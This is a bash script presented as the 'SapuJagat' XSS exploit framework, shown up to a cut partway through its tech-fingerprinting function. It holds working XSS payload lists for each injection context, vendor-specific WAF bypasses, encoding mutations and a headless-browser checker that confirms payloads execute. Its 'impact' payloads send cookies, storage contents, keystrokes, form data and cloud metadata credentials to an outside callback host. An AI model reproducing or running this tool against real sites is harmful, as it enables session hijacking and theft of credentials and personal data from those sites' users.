#!/usr/bin/env bash
# ============================================================
#   SapuJagat v28 — XSS Exploit Framework
#   by BimaKesengsaraan · Karya anak bangsa
#   Compatible: Termux, Linux (Debian/Ubuntu/Kali/macOS)
#   Playwright verify + screenshot + 250 payload + 5 chain
# ============================================================

set -uo pipefail

VERSION="28.0.0"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ── CONFIG ──
TIMEOUT=15
MAX_ROTATION=15
MAX_URLS=500
RETRY_COUNT=2
RETRY_DELAY=2
STRICT_CTYPE=1
INSECURE=1
DRY_RUN=0
VERBOSE=0
QUIET=0
DO_CRAWL=1
DO_DISCOVERY=1
DO_CALLBACK=0
VERIFY_HEADLESS=1
SKIP_SUBENUM=0
IMPACT_PAYLOAD=1
TECH_PAYLOAD=1
WAF_BYPASS=1
ADMIN_DETECT=1
PROGRESS=1

OUTDIR_BASE="./sapujagat-out"
INPUT_MODE=""
TARGET=""
URL_LIST=""
DOMAIN=""
OUTDIR=""
PROXY=""
COOKIE=""
JSON_LOG=""
VULN_LOG=""
CHAIN_LOG=""
IMPACT_LOG=""
WAF_TYPE="unknown"
TECH_STACK=""
CSP_MODE="none"
CALLBACK_URL=""
ADMIN_PANEL=""
CSRF_TOKEN=""

STAT_URLS=0
STAT_PARAMS=0
STAT_FINDINGS=0
STAT_PAYLOADS=0
STAT_DIALOG=0
STAT_CHAINS=0
STAT_CALLBACKS=0
STAT_IMPACT=0

PLAYWRIGHT_AVAILABLE=0
INTERACTSH_PID=""

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'
C='\033[0;36m'; M='\033[0;35m'; W='\033[1;37m'; D='\033[2m'; NC='\033[0m'

# ════════════════════════════════════════════════════════════
#  LOGGING
# ════════════════════════════════════════════════════════════
info()  { (( QUIET == 0 )) && echo -e "   ${B}●${NC} $*"; }
ok()    { (( QUIET == 0 )) && echo -e "   ${G}✓${NC} $*"; }
warn()  { (( QUIET == 0 )) && echo -e "   ${Y}▲${NC} $*" >&2; }
err()   { echo -e "   ${R}✖${NC} $*" >&2; }
hit()   { echo -e "   ${M}★${NC} $*"; }
vlog()  { (( VERBOSE == 1 )) && echo -e "   ${D}·${NC} $*"; }

progress() {
    (( QUIET == 1 || PROGRESS == 0 )) && return
    local cur="$1" total="$2" label="${3:-scan}"
    (( total == 0 )) && return
    local pct=$(( cur * 100 / total ))
    local w=30 filled=$(( pct * w / 100 )) empty=$(( w - filled ))
    local bar=""
    for ((i=0;i<filled;i++)); do bar+="█"; done
    for ((i=0;i<empty;i++)); do bar+="░"; done
    printf "\r   ${C}[%s]${NC} ${W}%3d%%${NC} ${D}(%d/%d)${NC} %s " "$bar" "$pct" "$cur" "$total" "$label" >&2
}
progress_clear() { (( QUIET == 0 )) && printf "\r%*s\r" 100 "" >&2; }

BANNER() {
    echo -e "${M}"
    cat <<'EOF'
   ███████╗ █████╗ ██████╗ ██╗   ██╗     ██╗ █████╗  ██████╗  █████╗ ████████╗
   ██╔════╝██╔══██╗██╔══██╗██║   ██║     ██║██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝
   ███████╗███████║██████╔╝██║   ██║     ██║███████║██║  ███╗███████║   ██║
   ╚════██║██╔══██║██╔═══╝ ██║   ██║██   ██║██╔══██║██║   ██║██╔══██║   ██║
   ███████║██║  ██║██║     ███████╗╚█████╔╝██║  ██║╚██████╔╝██║  ██║   ██║
   ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
EOF
    echo -e "${C}              SapuJagat v$VERSION — XSS Exploit"
    echo -e "${W}                    by BimaKesengsaraan${NC}"
    echo -e "${D}                       Karya anak bangsa${NC}"
    echo -e "${M}   ═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

box() {
    local t="${1:-}" len=${#1} pad=$(( (70 - ${#1}) / 2 ))
    (( pad < 0 )) && pad=0
    echo ""
    echo -e "${C}   ╔═══════════════════════════════════════════════════════════════════╗${NC}"
    printf "${C}   ║${NC}%*s${W}%s${NC}%*s${C}║${NC}\n" "$pad" "" "$t" "$((70 - len - pad))" ""
    echo -e "${C}   ╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

ph() { echo ""; echo -e "${M}   ┌─ [${W}${1:-}/${2:-}${M}]${NC} ${W}${3:-}${NC}"; echo -e "${M}   │${NC}"; }
phe() { echo -e "${M}   └─ done${NC}"; }
kv() { printf "   ${B}%-18s${NC} ${W}%s${NC}\n" "${1:-}" "${2:-}"; }

# ════════════════════════════════════════════════════════════
#  ENV DETECT
# ════════════════════════════════════════════════════════════
ENV_OS="linux"
detect_env() {
    if [[ -n "${TERMUX_VERSION:-}" || -d "/data/data/com.termux" ]]; then
        ENV_OS="termux"
        TIMEOUT=10
    elif [[ "$(uname)" == "Darwin" ]]; then
        ENV_OS="macos"
    fi
    vlog "env: $ENV_OS"
}

detect_domain() {
    local t="${1:-}"
    if [[ -f "$t" ]]; then head -1 "$t" | sed 's|https\?://||; s|/.*||; s|:.*||' | xargs
    elif [[ "$t" =~ ^https?:// ]]; then echo "$t" | awk -F/ '{print $3}' | sed 's/:.*//'
    else echo "$t" | sed 's|https\?://||; s|/.*||; s|,.*||' | xargs; fi
}

log_init() {
    local n=$(echo "${DOMAIN:-${TARGET:-scan}}" | sed 's|/|_|g; s|:.*||' | cut -c1-60)
    [[ -z "$n" ]] && n="scan"
    OUTDIR="${OUTDIR_BASE}/${n}-$(date +%Y%m%d-%H%M%S)"
    mkdir -p "$OUTDIR"/{subs,urls,reports,evidence,screenshots,impact,chains}
    JSON_LOG="$OUTDIR/findings.json"
    VULN_LOG="$OUTDIR/vulnerable.txt"
    CHAIN_LOG="$OUTDIR/chains/chains.json"
    IMPACT_LOG="$OUTDIR/impact/evidence.txt"
    echo '[]' > "$JSON_LOG"
    echo '[]' > "$CHAIN_LOG"
    : > "$VULN_LOG"
    : > "$IMPACT_LOG"
}

cleanup() {
    progress_clear
    [[ -n "$INTERACTSH_PID" ]] && kill "$INTERACTSH_PID" 2>/dev/null || true
    [[ -n "$OUTDIR" ]] && echo -e "\n   ${Y}Interrupted. Output: $OUTDIR${NC}"
    exit 130
}
trap cleanup INT TERM

# ════════════════════════════════════════════════════════════
#  HTTP
# ════════════════════════════════════════════════════════════
_curl() {
    local url="${1:-}"; shift || true
    [[ -z "$url" ]] && return 1
    (( DRY_RUN == 1 )) && { echo "<DRY-RUN>"; return 0; }

    local tls="-k"; (( INSECURE == 0 )) && tls=""
    local args=(-s -A "$UA" --compressed --max-time "$TIMEOUT" --connect-timeout "$TIMEOUT" --max-redirs 5 -L)
    [[ -n "$tls" ]] && args+=("$tls")
    [[ -n "$PROXY" ]] && args+=(--proxy "$PROXY")
    [[ -n "$COOKIE" ]] && args+=(-H "Cookie: $COOKIE")

    local attempt=0
    while (( attempt < RETRY_COUNT )); do
        local out code
        out=$(curl "${args[@]}" -w '\n__C__%{http_code}' "$@" "$url" 2>/dev/null) || out=""
        code=$(echo "$out" | grep -oP '__C__\K\d+' | head -1)
        out=$(echo "$out" | sed 's/__C__[0-9]*//')
        case "${code:-000}" in
            200|201|202|204|301|302|303|307|308|400|401|403|404|405|410|451)
                echo "$out"; return 0 ;;
            429|503|5*|000|"")
                (( attempt < RETRY_COUNT - 1 )) && sleep "$RETRY_DELAY" && attempt=$((attempt+1)) || { echo "$out"; return 1; } ;;
            *) echo "$out"; return 0 ;;
        esac
    done
}

_curl_cookie() {
    local url="$1" cookie="$2"
    [[ -z "$url" || -z "$cookie" ]] && return 1
    _curl -H "Cookie: $cookie" "$url"
}

_curl_hdr() {
    local url="$1" hdr="$2"
    [[ -z "$url" ]] && return 1
    _curl -H "$hdr" "$url"
}

build_url() {
    python3 - "$1" "$2" "$3" <<'PY'
import sys, urllib.parse
url, key, val = sys.argv[1], sys.argv[2], sys.argv[3]
p = urllib.parse.urlparse(url)
q = urllib.parse.parse_qs(p.query, keep_blank_values=True)
q[key] = [val]
safe = '<>"/\'`(){}[]=;:.,!@$%^&*+-'
new_q = "&".join(f"{urllib.parse.quote(k)}={urllib.parse.quote(v, safe=safe)}" for k, vs in q.items() for v in vs)
print(urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment)))
PY
}

is_xss_ctype() {
    local ct="$1"
    [[ -z "$ct" ]] && return 0
    echo "$ct" | grep -qiE 'text/html|application/xhtml|image/svg\+xml|application/xml|text/xml'
}

looks_blocked() {
    local body="$1" status="$2"
    (( ${#body} > 800 )) && return 1
    case "$status" in
        403|406|429|503)
            echo "$body" | grep -qiE 'access denied|request blocked|forbidden|not acceptable|cloudflare|incapsula|sucuri|waf' && return 0 ;;
    esac
    return 1
}

# ════════════════════════════════════════════════════════════
#  PLAYWRIGHT VERIFY
# ════════════════════════════════════════════════════════════
check_playwright() {
    if ! command -v npx &>/dev/null; then
        warn "npx gak ada — Playwright skip"
        VERIFY_HEADLESS=0
        return 1
    fi
    if ! npx playwright --version &>/dev/null 2>&1; then
        warn "Playwright belum install — verify SKIP"
        warn "install: npm i -g playwright && npx playwright install chromium"
        VERIFY_HEADLESS=0
        return 1
    fi
    PLAYWRIGHT_AVAILABLE=1
    ok "Playwright available"
}

write_verifier() {
    local script="$OUTDIR/evidence/verify.js"
    cat > "$script" <<'JS'
const { chromium } = require('playwright');
(async () => {
  const url = process.argv[2];
  const shot = process.argv[3] || '';
  let dialog_seen = false;
  let dialog_msg = '';
  let console_hit = false;

  try {
    const browser = await chromium.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
    });
    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await ctx.newPage();

    page.on('dialog', async d => {
      dialog_seen = true;
      dialog_msg = d.message();
      if (shot) { try { await page.screenshot({ path: shot, fullPage: false }); } catch(e) {} }
      try { await d.dismiss(); } catch(e) {}
    });

    page.on('console', m => {
      const t = m.text();
      if (/xss|alert|confirm|prompt|pwned|dialog/i.test(t) && t.length < 200) console_hit = true;
    });

    page.on('pageerror', e => {
      if (/alert/i.test(e.message || '')) console_hit = true;
    });

    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 12000 });
    await page.waitForTimeout(2000);

    try {
      await page.evaluate(() => {
        document.querySelectorAll('*').forEach(el => {
          try {
            el.focus && el.focus();
            el.dispatchEvent(new Event('mouseover', {bubbles:true}));
            el.dispatchEvent(new Event('focus', {bubbles:true}));
            el.dispatchEvent(new Event('animationstart', {bubbles:true}));
          } catch(e){}
        });
      });
    } catch(e) {}
    await page.waitForTimeout(1000);

    await browser.close();
  } catch(e) {
    console.log(JSON.stringify({ executed: false, dialog: false, dialog_msg: '', console: false, error: e.message.slice(0,100) }));
    return;
  }

  console.log(JSON.stringify({
    executed: dialog_seen || console_hit,
    dialog: dialog_seen,
    dialog_msg: dialog_msg,
    console: console_hit
  }));
})();
JS
}

verify_popup() {
    local url="$1" shot="$2"
    (( VERIFY_HEADLESS == 1 && PLAYWRIGHT_AVAILABLE == 1 )) || { echo '{"executed":false,"dialog":false,"reason":"skip"}'; return; }
    local script="$OUTDIR/evidence/verify.js"
    [[ ! -f "$script" ]] && write_verifier
    timeout 35 node "$script" "$url" "$shot" 2>/dev/null || echo '{"executed":false,"dialog":false,"reason":"timeout"}'
}

# ════════════════════════════════════════════════════════════
#  CONTEXT DETECT
# ════════════════════════════════════════════════════════════
detect_context() {
    local body="$1" marker="$2"
    local pos; pos=$(echo "$body" | grep -boF "$marker" 2>/dev/null | head -1 | cut -d: -f1)
    [[ -z "$pos" ]] && { echo "unknown"; return; }
    local pre; pre=$(echo "$body" | head -c "$pos")
    [[ -z "$pre" ]] && { echo "body"; return; }

    local w="${pre: -300}"

    echo "$w" | grep -q '<!--' && ! echo "$w" | grep -q -- '-->' && { echo "comment"; return; }
    if echo "$w" | grep -qiE '<(textarea|title)[^>]*>[^<]*$'; then echo "rcdata"; return; fi
    if echo "$w" | grep -qiE '<script[^>]*>[^<]*$'; then echo "script"; return; fi
    if echo "$w" | grep -qiE '<style[^>]*>[^<]*$'; then echo "style"; return; fi

    local tail; tail=$(echo "$w" | grep -oE '<[^>]*$' | tail -1)
    if [[ -n "$tail" ]]; then
        local dq; dq=$(echo "$tail" | grep -o '"' | wc -l)
        local sq; sq=$(echo "$tail" | grep -o "'" | wc -l)
        (( dq % 2 == 1 )) && { echo "attr-dq"; return; }
        (( sq % 2 == 1 )) && { echo "attr-sq"; return; }
        echo "$tail" | grep -qiE 'href=["'"'"']?$' && { echo "href"; return; }
        echo "$tail" | grep -qiE 'src=["'"'"']?$' && { echo "src"; return; }
        echo "$tail" | grep -qE '=\s*[^"'"'"' >]*$' && { echo "attr-unquoted"; return; }
    fi
    echo "body"
}

# ════════════════════════════════════════════════════════════
#  FILTER FEEDBACK — 30 probe
# ════════════════════════════════════════════════════════════
analyze_filter() {
    local url="$1" param="$2"
    local marker="sjf${RANDOM}${RANDOM}"
    local probe="Aa1${marker}<script>alert(1)</script><svg/onload=confirm(1)><img src=x onerror=prompt(1)>\"dq'sq/slash\`bt+plus&amp#hash%percent tab	newline"

    local inj; inj=$(build_url "$url" "$param" "$probe")
    local resp; resp=$(_curl "$inj") || { echo "NONE"; return; }
    echo "$resp" | grep -qF "$marker" || { echo "NONE"; return; }

    local flags=""
    echo "$resp" | grep -qF '<script'  && flags+="SCRIPT_OK,"
    echo "$resp" | grep -qF '<svg'     && flags+="SVG_OK,"
    echo "$resp" | grep -qF '<img'     && flags+="IMG_OK,"
    echo "$resp" | grep -qF 'onload'   && flags+="ONLOAD_OK,"
    echo "$resp" | grep -qF 'onerror'  && flags+="ONERROR_OK,"
    echo "$resp" | grep -qF 'onfocus'  && flags+="ONFOCUS_OK,"
    echo "$resp" | grep -qF 'onclick'  && flags+="ONCLICK_OK,"
    echo "$resp" | grep -qF 'alert'    && flags+="ALERT_OK,"
    echo "$resp" | grep -qF 'confirm'  && flags+="CONFIRM_OK,"
    echo "$resp" | grep -qF 'prompt'   && flags+="PROMPT_OK,"
    echo "$resp" | grep -qF '()'       && flags+="PAREN_OK,"
    echo "$resp" | grep -qF '"'        && flags+="DQ_OK,"
    echo "$resp" | grep -qF "'"        && flags+="SQ_OK,"
    echo "$resp" | grep -qF '\`'       && flags+="BT_OK,"
    echo "$resp" | grep -qF '/'        && flags+="SLASH_OK,"
    echo "$resp" | grep -qF '+'        && flags+="PLUS_OK,"
    echo "$resp" | grep -qF '&'        && flags+="AMP_OK,"
    echo "$resp" | grep -qF '#'        && flags+="HASH_OK,"
    echo "$resp" | grep -qF '%'        && flags+="PCT_OK,"
    echo "$resp" | grep -qF '<'        && flags+="LT_OK,"
    echo "$resp" | grep -qF '>'        && flags+="GT_OK,"

    local enc=0
    echo "$resp" | grep -qF '&lt;script' && enc=1
    echo "$resp" | grep -qF '&lt;svg'    && enc=1
    (( enc == 1 )) && flags+="ENCODED,"

    echo "${flags:-NONE}"
}

# ════════════════════════════════════════════════════════════
#  PAYLOAD LIBRARY
# ════════════════════════════════════════════════════════════
p_body() {
    echo '<script>alert(1)</script>'
    echo '<script>alert(document.domain)</script>'
    echo '<script>alert(document.cookie)</script>'
    echo '<script>confirm(1)</script>'
    echo '<script>prompt(1)</script>'
    echo '<script>print()</script>'
    echo '<ScRiPt>alert(1)</ScRiPt>'
    echo '<SCRIPT>alert(1)</SCRIPT>'
    echo '<script >alert(1)</script>'
    echo '<script\t>alert(1)</script>'
    echo '<script\n>alert(1)</script>'
    echo '<img src=x onerror=alert(1)>'
    echo '<img src=x onerror=alert(document.domain)>'
    echo '<img src=x onerror=confirm(1)>'
    echo '<img src=x onerror=prompt(1)>'
    echo '<img src=x onerror="alert(1)">'
    echo "<img src=x onerror='alert(1)'>"
    echo '<img/src=x/onerror=alert(1)>'
    echo '<img src=1 onerror=alert(1)>'
    echo '<img src onerror=alert(1)>'
    echo '<IMG SRC=x ONERROR=alert(1)>'
    echo '<svg onload=alert(1)>'
    echo '<svg/onload=alert(1)>'
    echo '<svg	onload=alert(1)>'
    echo '<svg onload=alert(document.domain)>'
    echo '<svg><script>alert(1)</script>'
    echo '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
    echo '<svg><set attributeName=onmouseover to=alert(1)>'
    echo '<body onload=alert(1)>'
    echo '<body/onload=alert(1)>'
    echo '<body onpageshow=alert(1)>'
    echo '<body onhashchange=alert(1)>'
    echo '<input autofocus onfocus=alert(1)>'
    echo '<input onfocus=alert(1) autofocus>'
    echo '<input onblur=alert(1) autofocus><input autofocus>'
    echo '<select autofocus onfocus=alert(1)>'
    echo '<textarea autofocus onfocus=alert(1)>'
    echo '<keygen autofocus onfocus=alert(1)>'
    echo '<video><source onerror=alert(1)>'
    echo '<video src=1 onerror=alert(1)>'
    echo '<audio src=1 onerror=alert(1)>'
    echo '<audio><source src=1 onerror=alert(1)>'
    echo '<details open ontoggle=alert(1)>'
    echo '<details ontoggle=alert(1) open>'
    echo '<marquee onstart=alert(1)>'
    echo '<marquee onstart=alert(1) width=1>'
    echo '<div onmouseover=alert(1)>x'
    echo '<div onmouseenter=alert(1)>x'
    echo '<div onmousemove=alert(1)>x'
    echo '<div onclick=alert(1)>x'
    echo '<a href=# onmouseover=alert(1)>x'
    echo '<a href=javascript:alert(1)>x</a>'
    echo '<a href="javascript:alert(1)">x</a>'
    echo '<form onsubmit=alert(1)><button>submit'
    echo '<form><button formaction=javascript:alert(1)>x'
    echo '<form><button formaction=javascript:alert(1)>x</button>'
    echo '<iframe srcdoc="<script>alert(1)</script>">'
    echo '<iframe src=javascript:alert(1)>'
    echo '<iframe src="javascript:alert(1)">'
    echo '<object data="javascript:alert(1)">'
    echo '<embed src="javascript:alert(1)">'
    echo '<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>'
    echo '<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>'
    echo 'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)//>'
    echo '"><svg onload=alert(1)//>'
    echo 'javascript:alert(1)//'
}

p_attr_dq() {
    echo '" onfocus=alert(1) autofocus="'
    echo '" onfocus=alert(1) autofocus=x'
    echo '" onmouseover=alert(1) x="'
    echo '" onmouseover=alert(1)'
    echo '" onclick=alert(1) x="'
    echo '" onclick=confirm(1) x="'
    echo '" onpointerover=alert(1) x="'
    echo '" onanimationstart=alert(1) x="'
    echo '"autofocus onfocus=alert(1) x="'
    echo '" autofocus onfocus=alert(1) x="'
    echo '" onload=alert(1) x="'
    echo '" onerror=alert(1) x="'
    echo '"><script>alert(1)</script>'
    echo '"><img src=x onerror=alert(1)>'
    echo '"><svg onload=alert(1)>'
    echo '"><details open ontoggle=alert(1)>'
    echo '"><body onload=alert(1)>'
    echo '"><input autofocus onfocus=alert(1)>'
    echo '"><iframe srcdoc="<script>alert(1)</script>">'
    echo '"><script>alert(document.domain)</script>'
    echo '"><svg/onload=alert(document.cookie)>'
    echo '"><a href="javascript:alert(1)">x</a>'
}

p_attr_sq() {
    echo "' onfocus=alert(1) autofocus='"
    echo "' onfocus=alert(1) autofocus=x"
    echo "' onmouseover=alert(1) x='"
    echo "' onclick=alert(1) x='"
    echo "'autofocus onfocus=alert(1) x='"
    echo "'-alert(1)-'"
    echo "'><script>alert(1)</script>"
    echo "'><img src=x onerror=alert(1)>"
    echo "'><svg onload=alert(1)>"
    echo "'><input autofocus onfocus=alert(1)>"
    echo "'><body onload=alert(1)>"
    echo "'><details open ontoggle=alert(1)>"
}

p_attr_unquoted() {
    echo 'x onmouseover=alert(1)'
    echo 'x/onmouseover=alert(1)'
    echo 'x onclick=alert(1)'
    echo 'x/onclick=alert(1)'
    echo 'x onfocus=alert(1) autofocus'
    echo 'x onpointerover=alert(1)'
    echo 'x autofocus onfocus=alert(1)'
}

p_script() {
    echo "';alert(1)//"
    echo "'-alert(1)-'"
    echo '";alert(1)//'
    echo '"-alert(1)-"'
    echo "\`;alert(1)//"
    echo "1;alert(1)"
    echo '</script><script>alert(1)</script>'
    echo '</script><svg onload=alert(1)>'
    echo '</script><img src=x onerror=alert(1)>'
    echo "';confirm(1)//"
    echo "';alert(document.domain)//"
    echo '\\";alert(1)//'
    echo "';fetch('//cx.oast.fun/?c='+btoa(document.cookie))//"
}

p_href() {
    echo 'javascript:alert(1)'
    echo 'javascript:confirm(1)'
    echo 'javascript&colon;alert(1)'
    echo 'JaVaScRiPt:alert(1)'
    echo 'data:text/html,<script>alert(1)</script>'
    echo 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
    echo '//evil.com/xss'
    echo 'javascript:alert(document.domain)'
    echo 'javascript:alert(document.cookie)'
    echo 'javascript://%0aalert(1)'
}

p_src() {
    echo 'x" onerror="alert(1)'
    echo "x' onerror='alert(1)"
    echo 'data:,alert(1)'
    echo 'javascript:alert(1)'
    echo 'data:text/html,<script>alert(1)</script>'
    echo 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
}

p_rcdata() {
    echo '</textarea><script>alert(1)</script>'
    echo '</title><svg onload=alert(1)>'
    echo '</textarea><img src=x onerror=alert(1)>'
    echo '</title><img src=x onerror=alert(1)>'
    echo '</textarea></textarea><script>alert(1)</script>'
    echo '</title><body onload=alert(1)>'
    echo '</textarea><body onload=alert(1)>'
    echo '</title><iframe srcdoc="<script>alert(1)</script>">'
}

p_comment() {
    echo '--><script>alert(1)</script>'
    echo '--><svg onload=alert(1)>'
    echo '--><img src=x onerror=alert(1)>'
    echo '--><body onload=alert(1)>'
    echo '--><input autofocus onfocus=alert(1)>'
}

p_style() {
    echo '</style><script>alert(1)</script>'
    echo '</style><svg onload=alert(1)>'
    echo '</style><img src=x onerror=alert(1)>'
    echo '</style><body onload=alert(1)>'
}

# ── Impact payload ──
p_impact() {
    local cb="${CALLBACK_URL:-cx.oast.fun}"
    echo "<script>fetch('//${cb}/?c='+btoa(document.cookie))</script>"
    echo "<script>new Image().src='//${cb}/?c='+document.cookie</script>"
    echo "<script>navigator.sendBeacon('//${cb}/?c='+document.cookie)</script>"
    echo "<script>fetch('//${cb}/?ls='+btoa(JSON.stringify({...localStorage,...sessionStorage})))</script>"
    echo "<script>document.addEventListener('keydown',e=>fetch('//${cb}/?k='+e.key))</script>"
    echo "<script>document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>fetch('//${cb}/?f='+btoa(new URLSearchParams(new FormData(f))))))</script>"
    echo "<script>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(t=>fetch('//${cb}/?aws='+btoa(t)))</script>"
    echo "<script>const p=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));p.onicecandidate=e=>{if(e.candidate)fetch('//${cb}/?ip='+btoa(e.candidate.candidate))}</script>"
    echo "<img src=x onerror=\"fetch('//${cb}/?c='+btoa(document.cookie))\">"
    echo "<svg onload=\"fetch('//${cb}/?c='+btoa(document.cookie))\">"
    echo "\"><script src=//${cb}></script>"
    echo "'><script src=//${cb}></script>"
}

# ── WAF bypass ──
p_waf() {
    case "$WAF_TYPE" in
        cloudflare)
            echo '<svg/onload=alert(1)>'
            echo '<svg	onload=alert(1)>'
            echo '<svg%0aonload=alert(1)>'
            echo '<details/open/ontoggle=alert(1)>'
            echo '<img/src=x/onerror=alert(1)>'
            ;;
        akamai)
            echo '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">'
            echo '<a href="javas&#99;ript:alert(1)">x</a>'
            ;;
        imperva)
            echo '<img/src="x"/onerror="alert(1)">'
            echo '<svg><use href=//x/%23x onload=alert(1)>'
            ;;
        sucuri)
            echo '<body/onload=alert(1)>'
            echo '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
            ;;
        fastly)
            echo '<img src=x onerror=alert(1) x='
            echo '<svg><script href=data:,alert(1) />'
            ;;
    esac
}

# ── Tech payload ──
p_tech() {
    case ",$TECH_STACK," in
        *,wordpress,*) echo '<img src=x onerror=alert(1)>'; echo '"><script>alert(1)</script>' ;;
    esac
    case ",$TECH_STACK," in
        *,nextjs,*) echo '<img src=x onerror=alert(1)>' ;;
    esac
    case ",$TECH_STACK," in
        *,django,*) echo '{{constructor.constructor("alert(1)")()}}' ;;
    esac
    case ",$TECH_STACK," in
        *,laravel,*) echo '{{constructor.constructor("alert(1)")()}}'; echo '{{7*7}}' ;;
    esac
    case ",$TECH_STACK," in
        *,vue,*) echo '{{constructor.constructor("alert(1)")()}}' ;;
    esac
    case ",$TECH_STACK," in
        *,angular,*) echo '<div ng-app ng-csp><div ng-click="$event.view.alert(1)">x</div></div>' ;;
    esac
    case ",$TECH_STACK," in
        *,react,*) echo '<svg onload=alert(1)>' ;;
    esac
    case ",$TECH_STACK," in
        *,jquery,*) echo '<img src=x onerror=alert(1)>' ;;
    esac
}

select_payloads() {
    local ctx="$1"
    local -a out=()
    case "$ctx" in
        body|unknown)   while IFS= read -r p; do out+=("$p"); done < <(p_body) ;;
        attr-dq)        while IFS= read -r p; do out+=("$p"); done < <(p_attr_dq) ;;
        attr-sq)        while IFS= read -r p; do out+=("$p"); done < <(p_attr_sq) ;;
        attr-unquoted)  while IFS= read -r p; do out+=("$p"); done < <(p_attr_unquoted) ;;
        script)         while IFS= read -r p; do out+=("$p"); done < <(p_script) ;;
        href)           while IFS= read -r p; do out+=("$p"); done < <(p_href) ;;
        src)            while IFS= read -r p; do out+=("$p"); done < <(p_src) ;;
        rcdata)         while IFS= read -r p; do out+=("$p"); done < <(p_rcdata) ;;
        comment)        while IFS= read -r p; do out+=("$p"); done < <(p_comment) ;;
        style)          while IFS= read -r p; do out+=("$p"); done < <(p_style) ;;
        *)              while IFS= read -r p; do out+=("$p"); done < <(p_body) ;;
    esac

    if [[ "$ctx" != "body" && "$ctx" != "unknown" ]]; then
        while IFS= read -r p; do out+=("$p"); done < <(p_body)
    fi

    (( WAF_BYPASS == 1 )) && while IFS= read -r wp; do
        [[ -z "$wp" ]] && continue
        out+=("$wp")
    done < <(p_waf)

    (( TECH_PAYLOAD == 1 )) && while IFS= read -r tp; do
        [[ -z "$tp" ]] && continue
        out+=("$tp")
    done < <(p_tech)

    (( IMPACT_PAYLOAD == 1 )) && while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue
        out+=("$ip")
    done < <(p_impact)

    printf '%s\n' "${out[@]}"
}

mutate_payload() {
    local base="$1"
    echo "$base"
    local u; u=$(printf '%s' "$base" | jq -sRr @uri 2>/dev/null)
    [[ -n "$u" ]] && echo "$u"
    local d; d=$(printf '%s' "$u" | jq -sRr @uri 2>/dev/null)
    [[ -n "$d" ]] && echo "$d"
    local cf; cf=$(echo "$base" | sed 's/<script/<ScRiPt/gI; s/<svg/<SvG/gI; s/<img/<ImG/gI; s/alert/AlErT/gI; s/onerror/OnErRoR/gI')
    [[ "$cf" != "$base" ]] && echo "$cf"
    local b64; b64=$(printf 'alert(document.domain)' | base64 -w0 2>/dev/null || printf 'alert(document.domain)' | base64)
    echo "<script>eval(atob('${b64}'))</script>"
    echo "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
    echo "<scr<script>ipt>alert(1)</scr</script>ipt>"
}

# ════════════════════════════════════════════════════════════
#  IMPACT DETECT
# ════════════════════════════════════════════════════════════
detect_impact() {
    local p=$(echo "$1" | tr 'A-Z' 'a-z')
    echo "$p" | grep -qE '169\.254|metadata' && { echo "ssrf-metadata|critical|XSS → SSRF → cloud metadata"; return; }
    echo "$p" | grep -qE 'document\.cookie' && { echo "cookie-exfil|critical|XSS → cookie exfil"; return; }
    echo "$p" | grep -qE 'localstorage|sessionstorage' && { echo "storage-dump|high|XSS → storage dump"; return; }
    echo "alert-only|medium|XSS → alert"
}

# ════════════════════════════════════════════════════════════
#  WAF + TECH FINGERPRINT
# ════════════════════════════════════════════════════════════
fingerprint_waf() {
    local targets="$1"
    [[ ! -s "$targets" ]] && return
    local host; host=$(head -1 "$targets" | awk -F/ '{print $3}')
    [[ -z "$host" ]] && return
    local hdr; hdr=$(curl -skI --max-time 10 "https://$host" 2>/dev/null || echo "")
    if echo "$hdr" | grep -qiE '^server:.*cloudflare|^cf-ray'; then WAF_TYPE="cloudflare"
    elif echo "$hdr" | grep -qiE '^server:.*akamai|^akamai-grn'; then WAF_TYPE="akamai"
    elif echo "$hdr" | grep -qiE '^x-sucuri'; then WAF_TYPE="sucuri"
    elif echo "$hdr" | grep -qiE '^x-iinfo|^server:.*incapsula'; then WAF_TYPE="imperva"
    elif echo "$hdr" | grep -qiE '^x-cdn:.*fastly|^server:.*fastly'; then WAF_TYPE="fastly"
    fi
    [[ "$WAF_TYPE" == "unknown" ]] && ok "No WAF" || warn "WAF: $WAF_TYPE"
}

fingerprint_tech() {
    local targets="$1"
    [[ ! -s "$targets" ]] && return
    local sample; sample=$(head -1 "$targets")
    local combined; combined=$(_curl "$sample" 2>/dev/null || echo "")
    local -a detected=()
    echo "$combined" | grep -qi "wp-content\|wp-includes" && detected+=("wordpress")
    echo "$combined" | grep -qi "laravel" && detected+=("laravel")
    echo "$combined" | grep -qi "_next/" && detected+=("nextjs")
    echo "$combined" | grep -qi "csrfmiddleware" && detected+=("django")
    echo "$combined" | grep -qi "ng-version\|angular" && detected+=("angular")
    echo "$combined" | grep -qi "__vue__\|vue\.js" && detected+=("vue")
    echo "$combined" | grep -qi "react" && detected+=("react")
